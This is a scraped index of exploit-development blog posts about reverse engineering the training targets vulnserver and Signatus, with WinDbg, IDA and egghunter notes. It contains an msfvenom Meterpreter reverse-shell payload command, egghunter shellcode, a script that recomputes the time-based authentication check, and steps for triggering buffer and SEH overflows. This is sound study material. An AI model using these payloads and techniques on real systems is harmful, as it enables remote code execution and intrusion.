2024","permalink":"/posts/postsec/vulnserver_dep/","section":"Posts","summary":"We all (cybersecurity space) heard about DEP, some might don\u0026rsquo;t know and want to understand how it works and what its purpose.","title":"Demystifying DEP (Data Execution Prevention)"},{"content":"","date":null,"permalink":"/tags/lowlevel/","section":"Tags","summary":"","title":"Lowlevel"},{"content":"You can access my poc on vulnserver.exe for studying purpose.My github, I hope that help others if they are trying to develop or improve their skills through vulnserver.exe.\nThe link if you want to download vulnserver.exe and test on your own lab:\nvulnserver app If you haven\u0026rsquo;t checked yet please see:\nReverse Engineering Vulnserver.exe ","date":"25 May 2024","permalink":"/posts/postsec/vulnserver_poc/","section":"Posts","summary":"You can access my poc on vulnserver.","title":"Exploit Dev POC vulnserver.exe"},{"content":"What is egghunter ? Sometimes when developing an exploit we realize that we have a limited buffer to work and one of the solution is to store the shellcode somewhere else with a larger buffer area and have a small piece of code (aka egghunter) stored in the small area that will search for the shellcode (egg) located in the larger memory buffer. I will explain the egghunter assembly code. The first three instructions will store in edx the next page by performing the or operation then increasing it by 1 and save it into the stack with \u0026ldquo;push edx\u0026rdquo; instruction.\n00f6f96f 6681caff0f or dx,0FFFh 00f6f974 42 inc edx 00f6f975 52 push edx Now the next three instructions will move the hex value 0FFFFFE37 in eax, this is the negative value of 0x1C9. It has been used to avoid null bytes. What is 0x1C9 ? this is the system call value to invoke NtAccessCheckAndAlarm function, if the memory address we are checking is not valid, this function will return access violation which represents 0x5, the return value is stored in eax and we compare with 0x5.\n00f6f976 b837feffff mov eax,0FFFFFE37h 00f6f97b f7d8 neg eax 00f6f97d cd2e int 2Eh 00f6f97f 3c05 cmp al,5 Now the next two instructions, edx will restore(pop) the saved memory page previously in the stack and je instruction is evaluating the cmp instruction comparing the eax with 0x5 if equal, will jump back again to 0x00f6f96f memory address and will continue until a valid memory is found.\n00f6f981 5a pop edx 00f6f982 74eb je 00f6f96f The next 4 instructions, we move the string w00t into eax, we store the memory page address in edi and the scas instruction will compare the dword (4 bytes). If string is not found in the memory page we jump back to 0x00f6f974 memory address and increase page by one and continue. If we match we proceed to the next instruction.\n00f6f984 b877303074 mov eax,74303077h 00f6f989 89d7 mov edi,edx 00f6f98b af scas dword ptr es:[edi] 00f6f98c 75e6 jne 00f6f974 The next three instruction below will perform same operation as above by checking the next 4 bytes against the string \u0026ldquo;w00t\u0026rdquo;. if matches, we jmp edi (contains the memory address of our payload), if not we jump back again to 0x00f6f974 and increase memory page until we find the egg.\n00f6f98e af scas dword ptr es:[edi] 00f6f98f 75e3 jne 00f6f974 00f6f991 ffe7 jmp edi I hope that helps to understand the egghunter technique ðŸ˜„\n","date":"25 May 2024","permalink":"/posts/postsec/egghunter_explained/","section":"Posts","summary":"What is egghunter ?","title":"EggHunter Explained"},{"content":"I choose one more vulnerable application to perform reverse engineering and discover vulnerablities if you want to follow along you can download here vulnserver App .\nWhen reverse engineering the crucial part before starting is enumerating the application for entry points (locations where you can input data), for example TCP/UDP Ports, Files, Configuration Files, Windows Registry Keys etc\u0026hellip; after enumerating the target application on all possible entry points, you need to decide and pick one to start.\nSince this is a small application designed for you to learn exploit development, you will find quickly that the application is listening on port 9999 after running it and opening TCPView, you can download here sysintenal tools\nNow we need to send a dummy packet and analyze the code flow using a combination of static analysis technique and dynamic analysis. The tools I used is windbg debugger for dynamic analysis tool and IDA Free for static analysis. We need to know which function to hook, we can use IDA Free and open vulnserver.exe and see the imported function (imports tab). The function commonly used for networking is the recv function for TCP protocol.\nHooking the recv function, we just need to open windbg debugger and attach to process \u0026ldquo;vulnserver.exe\u0026rdquo; and set a breakpoint as showing below.\nbp ws2_32!recv Now we need to send a dummy packet, for that you can use this small piece of python code. You can run the code like: python poc-vulnserver.py IP Ex.: python poc-vulnserver.py 192.168.132.10\nimport socket import sys def main(): if len(sys.argv) != 2: print(\u0026#34;Usage: %s \u0026lt;ip_address\u0026gt;\\n\u0026#34; % (sys.argv[0])) sys.exit(1) server = sys.argv[1] port = 9999 buf = bytearray([0x41]*0x100) s = socket.socket(socket.AF_INET, socket.SOCK_STREAM) s.connect((server,port)) s.send(buf) resp = s.recv(1024) print(\u0026#34;Response: \u0026#34;,resp) s.close() if __name__ == \u0026#39;__main__\u0026#39;: main() You can see below our breakpoint getting hit and the memory address for our buffer is at 0x006c33c8 which is empty right now after issuing the dd command to display data in a double word (4 bytes). Your memory address will probably be different.\nYou can use the pt command to stop at the return address of the current function and check the memory address 0x006c33c8 again and we should see our 0x41 values.\nNow next step is to single step using the p command and follow using IDA Free, you can download IDA here Installing IDA is very simple, after installing IDA you can open the vulnserver.exe with IDA Free.\nClick on \u0026ldquo;New Button\u0026rdquo; and open vulnserver.exe and wait to fully disassemble. Note.: Disassemble is the process of transforming machine code into assembler code (low level assembly language). Read More Here\nNow with windbg, you can enter the p command and hit enter. Now copy the memory address on the left that shows on the \u0026ldquo;sub esp,10h\u0026rdquo; instruction. Go to IDA and hit the \u0026ldquo;g\u0026rdquo; keyword on your keyboard to \u0026ldquo;Jump to address\u0026rdquo; and paste the addresss as showing below and click Ok. Note.: If the memory address doesn\u0026rsquo;t match in IDA, you can change, \u0026ldquo;Got to Edit -\u0026gt; Segments -\u0026gt; Rebase Program\u0026hellip;\u0026rdquo;. You can locate the base memory address by running the following command in windbg: lm m vulnserver. You can reach out to me if you have any question. If you are not seeing the address in IDA Free you can enable by going to \u0026ldquo;Options -\u0026gt; General -\u0026gt; Line prefixes (graph)\u0026rdquo; and click on OK button.\nNow we landed at memory address: 0x401958 in IDA Free and we can follow along with Windbg. By looking at Graph overview in IDA we see this function is quite large with a good amount of if and else condition.\nWe can continue to step through in Windbg debugger using the p command, we see at the address 0x00401961 it compares the size of our payload 0x100 against the value 0 and it checks if is less or equal to 0, we don\u0026rsquo;t take this jump and continue to the next branch.\nWe see a series of branches basically performing the same thing only changing the \u0026ldquo;offset Str2\u0026rdquo;, for example the one below has a string called \u0026ldquo;HELP \u0026quot; and our buffer is stored in eax later copied to the stack along with the \u0026ldquo;HELP \u0026quot; string as arguments for the function strncmp. the strncmp will compare first 4 bytes of our payload with the string \u0026ldquo;HELP \u0026quot; and if equal, we take false branch (red) color, if not equal the comparison is true so we take the green arrow.\nAfter reviewing the whole function we see the behaviour is the same, the first 4 bytes of our payload is compared against multiple strings which represents specific functionalities in the software. If the 4 bytes matches with the string supplied by our buffer the functionality is performed. What we need to do is to review each block for possible vulnerabilities and attempt to trigger via custom crafted packet.\nI found several functionalities vulnerable to buffer overflow due to the code not using the safe strcpy function which does not take the size in consideration only destination and source address are used if destination is larger than source address will result in writing out of bounds data into the buffer. I will show you only two examples.\nThe first string of our example that triggers the vulnerablity is \u0026ldquo;GTER \u0026quot; string which lead us to the vulnerable code path at 0x00402060, I renamed in IDA Free to \u0026ldquo;_vuln_strcpy\u0026rdquo; function. If you update the poc code above to send a string \u0026ldquo;GTER \u0026quot; followed by a long string you should be able to overwrite the return address and control EIP.\nThe second string is \u0026ldquo;KSTET \u0026quot; which triggers the code path to the vulnerable function which I renamed to \u0026ldquo;_vuln_strcpy2\u0026rdquo;.\nI hope that you enjoyed and this could help anybody trying to learn reverse engineering ðŸ˜„\n","date":"25 May 2024","permalink":"/posts/postsec/vulnserver_revereng01/","section":"Posts","summary":"I choose one more vulnerable application to perform reverse engineering and discover vulnerablities if you want to follow along you can download here vulnserver App .","title":"Reverse Engineering Vulnserver.exe"},{"content":"If you need to jump backwards to reach to your shellcode, we can use nasm_shell from msf to demonstrate.\nLets say we want to jump backwards 100 bytes (0x64) bytes, we first need to open the nasm_shell with following command below\nmsf-nasm_shell You type the follow command:\nnasm \u0026gt; jmp short -100 00000000 EB9A jmp short 0xffffff9c I hope that helps ðŸ˜‰\n","date":"21 May 2024","permalink":"/posts/postsec/nasm_shell_negativejmp/","section":"Posts","summary":"If you need to jump backwards to reach to your shellcode, we can use nasm_shell from msf to demonstrate.","title":"NASM Negative Jump (jump Backwards)"},{"content":"During exploit development sometimes we need to perform a short jump, we can use nasm_shell from msf to demonstrate.\nLets say we want to jump 12 (0xc) bytes, we first need to open the nasm_shell with following command below\nmsf-nasm_shell You type the follow command:\nnasm \u0026gt; jmp short 12 00000000 EB0A jmp short 0xc I hope that helps ðŸ˜‰\n","date":"21 May 2024","permalink":"/posts/postsec/nasm_shell_shortjmp/","section":"Posts","summary":"During exploit development sometimes we need to perform a short jump, we can use nasm_shell from msf to demonstrate.","title":"NASM Short Jump"},{"content":"You can access my poc on signatus.exe for studying purpose.My github, I hope that help others if they are trying to develop or improve their skills through signatus.exe.\nThe link if you want to download Signatus.exe and test on your own lab:\nbmddy My own Lab,Poc Screenshot - Meterpreter Reverse Shell If you haven\u0026rsquo;t checked yet please see:\nReverse Engineering Signatus.exe (bmdyy) - Part 1 Reverse Engineering Signatus.exe (bmdyy) - Part 2 ","date":"17 May 2024","permalink":"/posts/postsec/signatus_poc/","section":"Posts","summary":"You can access my poc on signatus.","title":"Signatus.exe (bmdyy) - Exploit Dev POC"},{"content":"Continuing the second part of my reverse engineering the signatus.exe bmddy. If you haven\u0026rsquo;t followed the first part, click here Reverse Engineering Signatus.exe (bmdyy) - Part 1\nIf you already read this 2nd part, the full poc I developed can be looked at my github repository Signatus.exe (bmdyy) - Exploit Dev POC\nAs discussed on part 1, we have to get a successful condition at jz instruction at 0x60AE13E5 memory address which compares the result of encrypt_timing_func + additional calculation against first 4 bytes of our payload, I already developed a function in Part-1 that will address this issue.\nNext we need to continue our reverse engineering analysis, a message is printed to the console saying \"\u003e correct ODT received.\". The sofware will make a call to WS2_32!recv and receive the next 4 bytes in our payload. Again after the call completes its compared against the returned value stored in eax against 0x0FFFFFFFFh (-1), the WS2_32!recv returns -1 if no data is received, if received, it returns the number of bytes received and store it in eax register. Next branch (0x60AE142C) will compare eax with 0x4, will jump to successful branch(red color) if the value is equal, otherwise will jump to unsuccessful (green arrow) and the program will print the failed message and continue to look for new incoming data. The program will take the succesful branch as we have data for the second 4 bytes. we should focus on function call 0x60AE1470 and I renamed in IDA Free to func_opcodes_analyze (0x60AE1470). The function will use the payload value at offset 0x8 in the payload as an opcode value that will be compared against multiple values and will perform an action if the opcode value matches.\nAfter reverse engineering the function I named to func_opcodes_analyze (0x60AE1470). I discovered the following valid opcodes:\nSignatus available Opcodes\n0x1 (0x60AE1107) -\u0026gt; Will append payload data to the file: c:\\Users\\Public\\signatus.log 0x2 (0x60AE11DB) -\u0026gt; Will read payload data from the file c:\\Users\\Public\\signatus.log 0x3 (0x60AE12A9) -\u0026gt; Will write payload data to the file c:\\Users\\Public\\signatus.log The out of bounds buffer memory corruption happens in the vfscanf function when reading data back from the file into the buffer, there is no size check before reading the data from the file which causes the program to write data beyond the buffer.\nTo trigger the vulnerability the following has to happen: Write to a file two times with large data using 0x1 opcode. Trigger a read operation by using 0x2 opcode instructing the program to read the data in the file back to program\u0026rsquo;s buffer Following the action above we will be able to overwrite SEH (Structure Exception Handler) and control EIP. The vulnerable function is located in the memory address 0x61AE123D\n","date":"16 May 2024","permalink":"/posts/postsec/signatus_revereng02/","section":"Posts","summary":"Continuing the second part of my reverse engineering the signatus.","title":"Reverse Engineering Signatus.exe (bmdyy) - Part 2"},{"content":"I am currently enrolled on OSED Course, I am taking a chance to practice more my reverse engineering skills and exploit development and bmddy wrote a program called Signatus and I will do a write up of my approach on reverse engineering the program. Please check Reverse Engineering Signatus.exe (bmdyy) - Part 2 if you already checked Part1.\nIf you have already read 1st part and 2nd part, the full poc I developed can be looked at my github Signatus.exe (bmdyy) - Exploit Dev POC\nMy approach was first finding entry points to feed input data where I can interact with the software and tracing the code with IDA Free (static analysis) and Windbg (Dynamic analysis). By executing the program we can see its listening on port 9999 (TCP).\nI like to write a small piece of python code to send a dummy packet and with the windbg debugger attached with a breakpoint on ws2_32!recv function.\nimport socket import sys def main(): if len(sys.argv) != 2: print(\u0026#34;Usage: %s \u0026lt;ip_address\u0026gt;\\n\u0026#34; % (sys.argv[0])) sys.exit(1) server = sys.argv[1] port = 9999 buf = bytearray[0x41]*0x100 s = socket.socket(socket.AF_INET, socket.SOCK_STREAM) s.connect((server,port)) s.send(buf) s.close() if __name__ == \u0026#39;__main__\u0026#39;: main() How do I know the software uses ws2_32!recv function to consume the data ?\nYou can load Signatus.exe on IDA Free and look for the imported functions (Imports\u0026rsquo;s tab in IDA)\nAttaching the debugger and set a breakpoint on WS2_32!recv (bp WS2_32!recv) and sending a dummy packet with the python script above.\nWe can see that the program checks if data was received successfully after the WS2_32!recv function returned by comparing the return value in eax with 0FFFFFFFFh (-1 in decimal). We can see the comparison below at the address: 60AE135C. We passed the check, the next check it compares the return value with hard coded value of 0x4, also showing below.\nBecause the return value is equal to 0x4, we do not follow the successful branch (green), we follow the (red) arrow. The next branch is the one of my interest as it contains the functionality that will deny or allow us to utilize further functionality in the software. Understanding this piece is crucial to allow us to go down the correct path for the vulnerability.\nThere are two import point to understand the 0x60AE1399 (call ds:_time64) will get current timestamp in number of seconds elapsed since midnight (00:00:00), January 1, 1970 _time64. The result of _time64 will be passed as argument to a function at 0x60AE13A8 (I renamed this funtcion as: encrypt_timing_func). This function encrypt_timing_func will receive as first argument the _time64 and second argument 0x0.\nLooking inside the encrypt_timing_func function this piece of code will perform arithmetic against the value generated by _time64 function. We see hardcoded 0xa (ecx) and 0x0 (eax) is used as well as part of division.\nThe value returned from the function discussed is used after the function is returned in the multiplication, left shit and xor instructions below. The result is stored in edx and compared with edi, the edi contains the first 4 bytes of our payload. If edx and edi matches, it will take (true condition) green arrow. If the value in edi (first 4 bytes of our payload) doesn\u0026rsquo;t match, the program will end and continue to listen for new incoming packets (input).\nHere we can understand that the first 4 bytes of our payload need to be equal to the value in edx which contains the value transformed through _time64 by encrypt_timing_func function (0x60AE13A8) and extra aritchmetic calculation after function is returned starting at (0x60AE13AD).\nI wrote a function in python that will generate the correct value for the first 4 bytes of our payload.\nRecommendation.: Run your poc script in the same machine where signatus.exe is stored or you will need to sync the time between signatus.exe machine and the remote machine, any time delay the poc won\u0026rsquo;t work.\nBelow is the piece of encrypt_timing_func function I wrote in python. I will continue the reverse engineering in Reverse Engineering Signatus.exe (bmdyy) - Part 2 where I will continue the reverse engineering to discover the memory corruption vulnerability.\ndef reverse_timing(timing): ecx = 0xa # Hard coded 0xa eax = 0x0 # Hard coded 0x0 # xor edx, edx edx = 0 # div ecx edx = (eax % ecx) # Store the remainder in edx eax = int(eax / ecx) # we div, we use int because of floating number # mov ebx, eax ebx = eax # Timing eax = int(timing) # Timing in eax # div ecx edx = (eax % ecx) # Store the remainder in edx eax = int(eax/ecx) # we div, we use int because of floating number # mov edx, ebx edx = ebx # dec edi edi = 0 edi = edi-1 \u0026amp; 0xFFFFFFFF # movzx esi, al esi = eax \u0026amp; 0xFF # mov eax, esi eax = esi # imul eax, esi eax = (eax * esi) # mov ecx, eax ecx = eax # imul ecx, esi ecx = (eax*esi) # mov edx, ecx edx = ecx # imul ecx, esi ecx = (ecx*esi) # and edx, 0FFFFFF00h edx = (edx \u0026amp; 0x0FFFFFF00) # shl edx, 4 edx = edx \u0026lt;\u0026lt; 4 # or edx, eax edx = (edx | eax) # and edx, 0x0FFFFFFF0h edx = (edx \u0026amp; 0x0FFFFFFF0) # and ecx, 0FFFFF000h ecx = (ecx \u0026amp; 0x0FFFFF000) # shl ecx, 8 ecx = (ecx \u0026lt;\u0026lt; 8) \u0026amp; 0xFFFFFFFF # or edx, ecx edx = (edx | ecx) \u0026amp; 0xFFFFFFFF # shl edx, 4 edx = (edx \u0026lt;\u0026lt; 4) \u0026amp; 0xFFFFFFFF # or edx, esi edx = (edx | esi) \u0026amp; 0xFFFFFFFF # xor edx, 74829726h edx = edx ^ 0x74829726 return edx ","date":"15 May 2024","permalink":"/posts/postsec/signatus_revereng01/","section":"Posts","summary":"I am currently enrolled on OSED Course, I am taking a chance to practice more my reverse engineering skills and exploit development and bmddy wrote a program called Signatus and I will do a write up of my approach on reverse engineering the program.","title":"Reverse Engineering Signatus.exe (bmdyy) - Part 1"},{"content":"Good resources to learn Malware Analysis/Dev\nVx-Underground\nmodexp\nx86matthew\npre-empt\nReflectiveDllDllInjection\nmeterpreter source code\n5pider\nOLABS\n","date":"15 May 2024","permalink":"/posts/postsec/maldev_rsc/","section":"Posts","summary":"Good resources to learn Malware Analysis/Dev","title":"Maldev Resources (Offensive Security)"},{"content":"The Ldr is one of the most important field in PEB, Ldr is a pointer to a PEB_LDR_DATA structure that contains information about the loaded modules for the process.\nIt\u0026rsquo;s useful when developing a customized shellcode during exploit developement to find the address of an already loaded module. Also useful for malware development to find an address of already loaded module dynamically.\ntypedef struct _PEB_LDR_DATA { BYTE Reserved1[8]; PVOID Reserved2[3]; LIST_ENTRY InMemoryOrderModuleList; } PEB_LDR_DATA, *PPEB_LDR_DATA; ","date":"12 May 2024","permalink":"/posts/postsec/ldr_struct/","section":"Posts","summary":"The Ldr is one of the most important field in PEB, Ldr is a pointer to a PEB_LDR_DATA structure that contains information about the loaded modules for the process.","title":"Ldr field in PEB"},{"content":"A really good book as a reference when working with Windows Native API, the book is old, but still relevant.\nWindows NT/2000 Native API Reference from Nebbett, Gary ","date":"11 May 2024","permalink":"/posts/postsec/windows_native_api_ref/","section":"Posts","summary":"A really good book as a reference when working with Windows Native API, the book is old, but still relevant.","title":"Windows Native API Book Referece"},{"content":"If you need to reverse engineer the windows kernel, the vergilius\u0026rsquo;s project is handy with thousands of undocumented structure covering several windows versions.\nThe Vergilius\u0026rsquo;s Project covers both x32 and x64 architecture.\nVergilius\u0026rsquo;s Project Official link #Click here Vergilius Link to go to the official website\n","date":"11 May 2024","permalink":"/posts/postsec/windows-_kernel_struct/","section":"Posts","summary":"If you need to reverse engineer the windows kernel, the vergilius\u0026rsquo;s project is handy with thousands of undocumented structure covering several windows versions.","title":"Windows Kernel Undocumented Structures (VERGILIUS's Project)"},{"content":"Two references websites if you need to understand how a particular windows api (InvokeAPI) or undocument structures (ReactOS) works on Windows.\nPinvoke #Note: You can just google for specific api, for example: \u0026ldquo;virtualalloc pinvoke\u0026rdquo;\nClick here PInvoke Win32 Apis to go to the official website\nI found a second pinvoke website as well PInvoke.dev Apis\nReactOS #You can follow the link ReactOS Undocumented Structures\nUndocumented NT Internals #You can access as well Undocumented NT Internals\nAlex IONESCU\u0026rsquo;s Blog #For Windows Internals/Reverse Engineering Alex IONESCU\u0026rsquo;s Blog\n","date":"11 May 2024","permalink":"/posts/postsec/wind32apis_winstructure/","section":"Posts","summary":"Two references websites if you need to understand how a particular windows api (InvokeAPI) or undocument structures (ReactOS) works on Windows.","title":"Win32 Api (pinvoke) \u0026 Windows Structures (ReactOS) \u0026 Undocumented NT Internals"},{"content":"We can load external plugins to help during reverse engineering/exploit development.\nfor instance if you want to load pykd, you need to place the pykd.pyd in ext folder.\npykd.pyd #Copy pykd.pyd to C:\\Program Files (x86)\\Windows Kits\\8.0\\Debuggers\\x86\\winext or C:\\Program Files (x86)\\Windows Kits\\10\\Debuggers\\x86\\winext\nExample in powershell:\ncopy-item pykd.pyd \u0026#34;C:\\Program Files (x86)\\Windows Kits\\8.0\\Debuggers\\x86\\winext\u0026#34; copy-item pykd.pyd \u0026#34;C:\\Program Files (x86)\\Windows Kits\\10\\Debuggers\\x86\\winext\u0026#34; You can use the windbg command to load the module\n.load pykd mona #You can follow the instructions here in the official link\n","date":"11 May 2024","permalink":"/posts/postsec/load_plugin_windbg/","section":"Posts","summary":"We can load external plugins to help during reverse engineering/exploit development.","title":"How to load external plugin windbg?"},{"content":"During exploit development sometimes we have a smaller buffer or part of buffer mangle the shellcode even when removing the bad characters. There are several solutions such as egghunter, build a custom shellcode and easiest option would try to use msfvenom with \u0026ndash;smallest parameter.\nExample:\nmsfvenom -p windows/meterpreter/reverse_tcp LHOST=IP LPORT=443 -b \u0026#34;\\x00\\x0a\\x1a\u0026#34; -f py -v shellcode --smallest ","date":"4 May 2024","permalink":"/posts/postsec/smalled_shellcode/","section":"Posts","summary":"During exploit development sometimes we have a smaller buffer or part of buffer mangle the shellcode even when removing the bad characters.","title":"How to generate smallest shellcode ? (msfvenom)"},{"content":"List of bad chars #Useful during exploit developement to detect bad chars.\nNote.: I excluded the \\x00 byte usually considered as bad chars for copy operations like memcpy. The byte range goes \\x01 to \\xFF.\nbadchars = ( b\u0026#34;\\x01\\x02\\x03\\x04\\x05\\x06\\x07\\x08\\x09\\x0a\\x0b\\x0c\\x0d\\x0e\\x0f\\x10\u0026#34; b\u0026#34;\\x11\\x12\\x13\\x14\\x15\\x16\\x17\\x18\\x19\\x1a\\x1b\\x1c\\x1d\\x1e\\x1f\\x20\u0026#34; b\u0026#34;\\x21\\x22\\x23\\x24\\x25\\x26\\x27\\x28\\x29\\x2a\\x2b\\x2c\\x2d\\x2e\\x2f\\x30\u0026#34; b\u0026#34;\\x31\\x32\\x33\\x34\\x35\\x36\\x37\\x38\\x39\\x3a\\x3b\\x3c\\x3d\\x3e\\x3f\\x40\u0026#34; b\u0026#34;\\x41\\x42\\x43\\x44\\x45\\x46\\x47\\x48\\x49\\x4a\\x4b\\x4c\\x4d\\x4e\\x4f\\x50\u0026#34; b\u0026#34;\\x51\\x52\\x53\\x54\\x55\\x56\\x57\\x58\\x59\\x5a\\x5b\\x5c\\x5d\\x5e\\x5f\\x60\u0026#34; b\u0026#34;\\x61\\x62\\x63\\x64\\x65\\x66\\x67\\x68\\x69\\x6a\\x6b\\x6c\\x6d\\x6e\\x6f\\x70\u0026#34; b\u0026#34;\\x71\\x72\\x73\\x74\\x75\\x76\\x77\\x78\\x79\\x7a\\x7b\\x7c\\x7d\\x7e\\x7f\\x80\u0026#34; b\u0026#34;\\x81\\x82\\x83\\x84\\x85\\x86\\x87\\x88\\x89\\x8a\\x8b\\x8c\\x8d\\x8e\\x8f\\x90\u0026#34; b\u0026#34;\\x91\\x92\\x93\\x94\\x95\\x96\\x97\\x98\\x99\\x9a\\x9b\\x9c\\x9d\\x9e\\x9f\\xa0\u0026#34; b\u0026#34;\\xa1\\xa2\\xa3\\xa4\\xa5\\xa6\\xa7\\xa8\\xa9\\xaa\\xab\\xac\\xad\\xae\\xaf\\xb0\u0026#34; b\u0026#34;\\xb1\\xb2\\xb3\\xb4\\xb5\\xb6\\xb7\\xb8\\xb9\\xba\\xbb\\xbc\\xbd\\xbe\\xbf\\xc0\u0026#34; b\u0026#34;\\xc1\\xc2\\xc3\\xc4\\xc5\\xc6\\xc7\\xc8\\xc9\\xca\\xcb\\xcc\\xcd\\xce\\xcf\\xd0\u0026#34; b\u0026#34;\\xd1\\xd2\\xd3\\xd4\\xd5\\xd6\\xd7\\xd8\\xd9\\xda\\xdb\\xdc\\xdd\\xde\\xdf\\xe0\u0026#34; b\u0026#34;\\xe1\\xe2\\xe3\\xe4\\xe5\\xe6\\xe7\\xe8\\xe9\\xea\\xeb\\xec\\xed\\xee\\xef\\xf0\u0026#34; b\u0026#34;\\xf1\\xf2\\xf3\\xf4\\xf5\\xf6\\xf7\\xf8\\xf9\\xfa\\xfb\\xfc\\xfd\\xfe\\xff\u0026#34;) ","date":"4 May 2024","permalink":"/posts/postsec/detect_badchars/","section":"Posts","summary":"List of bad chars #Useful during exploit developement to detect bad chars.","title":"Detect Bad Chars Exploit Development"},{"content":"","date":null,"permalink":"/tags/concept/","section":"Tags","summary":"","title":"Concept"},{"content":"I found an exellent post on stackoverflow explaining the differences between opcode, bytecode, mnemonic, machine code and assembly.\nOriginal link: \u0026lsquo;StackOverFlow Link\u0026rsquo;\nOPCODE #It is a number interpreted by your machine(virtual or silicon) that represents the operation to perform\nBYTECODE #Same as machine code, except, its mostly used by a software based interpreter(like Java or CLR)\nMNEMONIC #English word MNEMONIC means \u0026ldquo;A device such as a pattern of letters, ideas, or associations that assists in remembering something.\u0026rdquo;. So, its usually used by assembly language programmers to remember the \u0026ldquo;OPERATIONS\u0026rdquo; a machine can do, like \u0026ldquo;ADD\u0026rdquo; and \u0026ldquo;MUL\u0026rdquo; and \u0026ldquo;MOV\u0026rdquo; etc. This is assembler specific.\nMACHINE CODE #It is the sequence of numbers that flip the switches in the computer on and off to perform a certain job of work - such as addition of numbers, branching, multiplication, etc etc. This is purely machine specific and well documented by the implementers of the processor.\nAssembly #There are two \u0026ldquo;assemblies\u0026rdquo; - one assembly program is a sequence of mnemonics and operands that are fed to an \u0026ldquo;assembler\u0026rdquo; which \u0026ldquo;assembles\u0026rdquo; the mnemonics and operands into executable machine code. Optionally a \u0026ldquo;linker\u0026rdquo; links the assemblies and produces an executable file.\n","date":"19 March 2024","permalink":"/posts/postsec/lowlevel_concept/","section":"Posts","summary":"I found an exellent post on stackoverflow explaining the differences between opcode, bytecode, mnemonic, machine code and assembly.","title":"Low level computer concept"},{"content":"Using windbg we can check memory permission under Protect field.\n!vprot esp !vprot eip !vprot 00d13000 ","date":"19 March 2024","permalink":"/posts/postsec/windbg_mempermision_cmds/","section":"Posts","summary":"Using windbg we can check memory permission under Protect field.","title":"How to check Memory Permission in Windbg"},{"content":"Command below disable access violation and guard pages in Windbg\nRef.: Windbg Manual\nsxd av // Disable access violation sxd gp // Disable guard pages ","date":"19 March 2024","permalink":"/posts/postsec/windbg_guardpage_cmds/","section":"Posts","summary":"Command below disable access violation and guard pages in Windbg","title":"How to disable access violation/guardpage in windbg"},{"content":"All windbg commands here #Link to windgb manual\nAdd symbol #Go to File -\u0026gt; Symbol Search Path then add the path below\nsrv*c:\\symbols*https://msdl.microsoft.com/download/symbols Load the symbols #Note.: Attach to a process then run the command to load the symbols\n.reload /f Run the program #g Clear windbg screen #.cls Unassemble MNEMONIC instructions #The u command accepts memory address, range of memory address or symbol names. We can use \u0026ldquo;ub\u0026rdquo; command to disassemble by counting backwards.\nu module!function Read data from memory #db esp db 069fdcc db kernel32!WriteFile dw 069fdcc dd 069fdcc dq 069fdcc dW KERNELBASE+0X40 // show ascii value on the right dc KERNELBASE // show ascii character Control length to be displayed #The default is 0x80 bytes. The L parameter.\ndd esp L4 db esp L10 Display contents of address #sds (double word), dqs (Qword), dps (Pointer sized 4 byte or 8 byte depending on computer archtecture).\ndds esp L10 dds esp-10 L10 Derefence memory using poi #dd poi(esp) Dumping Structures from Memory #Display type the command is dt, the $teb is a pseudo register that provides address of the TEB\ndt ntdll!_TEB dt ntdll!_TEB @$teb ThreadLocalStoragePointer Display nested Structures from Memory #The -r will display nested structures, the $teb is the pseudo register that provides the address of the TEB\ndt -r ntdll!_TEB @$teb Display Exeption Registration Record #The !teb get the ExceptionList value and use with the dt command as showing below. Another option is !exchain command\n!teb dt _EXCEPTION_REGISTRATION_RECORD 0014f4a4 Calculate size of structure #?? sizeof(ntdll!_TEB) Writing a value to Memory #We can use the edit command followed by size (similar to the display command).\ned esp 41414141 // we are writing a dword to esp ( 4 bytes ) ed esp 41414141 ea esp \u0026#34;Hello\u0026#34; // we can modify ascii values using ea, we write Hello to esp eu esp Address \u0026#34;String\u0026#34; // we can modify to unicode value using eu, we write to esp. Searching the memory space #The -d meanins dword memory address, 0 means beginning of address the L? Length to search, we enter 80000000 to search and followed by value 41414141. we can search for ascii string using the -a flag as well.\ns -d 0 L?80000000 41414141 s -a 0 L?80000000 \u0026#34;This program cannot be run in DOS mode\u0026#34; // this earch for the ascii string via -a flag Inspecting and Editing CPU Register in WinDbg #We can use \u0026ldquo;r\u0026rdquo; command to display all register or individual register. We can use \u0026ldquo;r\u0026rdquo; to modify register values\nr // list all register r ecx // list only ecx r ecx=41414141 // This edit ecx with value of 41414141 Software BreakPoints #bp kernel32!WriteFile bl // list the breakpoints g // let execution run Disable/Enable BreakPoints #bd \u0026lt;number\u0026gt; // Disable Breakpoints, get the number with bl be \u0026lt;number\u0026gt; // Enable Breakpoints, get the number with bl Clear/Delete BreakPoints #bc \u0026lt;number\u0026gt; // clear specific breakpoints bc * to clear all breakpoints Unresolved Function Breakpoints #Function not loaded in process memory and it has not been resolved.\nbu ole32!WriteStringStream Breakpoint-Based Actions #The command below break and print number of bytes from WriteFile function, %p display given value as a pointer.\nbp kernel32!WriteFile \u0026#34;.printf \\\u0026#34;The number of bytes written is: %p\\\u0026#34;, poi(esp + 0x0C); .echo;g\u0026#34; Conditional Breakpoints Actions #Command below breaks if number of bytes written is 4 otherwise continue execution.\nbp kernel32!WriteFile \u0026#34;.if (poi(esp + 0x0C) != 4) {gc} .else { .printf \\\u0026#34;The number of bytes written is 4\\\u0026#34;; .echo;}\u0026#34; Hardware Breakpoints #Hardware breakpoints are performed on processor level in the register, x86/x64 have only 4 registers reserved for hardware breakpoints. The access can be: e (execute), r (read), w (write) Example: ba \u0026lt;size_bytes_in_memory\u0026gt; \u0026lt;memory_address\u0026gt;\nba e 1 kernel32!WriteFile ba w 2 00c56330 // we are set hardware breakpoint write access of first 2 bytes on memory address 00c56330 Stepping through the code #We can use p (step over the calls) and t (step into the calls) and pt (go end of the function) and ph ( execute code until branching instruction is reached), This includes conditional or unconditional branches, functions calls and return instructions.\nThe pa \u0026lt;adddress\u0026gt; (step to Address) executes until reaches the specified memory address. Listing Modules and Symbols #We can use lm command do display loaded modules start/end addresses. The deferred for specific modules means no symbols are loaded and .reaload /f can be used to load the symbols.\nlm lm f We can also filter modules with the command below\nlm m kernel* We can learn more about the symbols using the x command, example\nx kernelbase!CreateProc* Windbg as a calculator #Mathematical evaluation is performed using the ? Command. The input is assumed to be in hex format.\n? 77269bc0 - 77231430 // substraction of memory address ? 77269bc0 \u0026gt;\u0026gt; 18 // shifting a address by 18 bytes Data Output Format #by default windbg display result in hexdecimal format. We can conver hex to decimal with 0n prefix or binary to hex with 0xy prefix\n? 0n41414141 // converts 41414141 from hex to decimal format ? 0y1110100110111 // convert binary value to hex and decimal The .formats allow us to convert to all representation 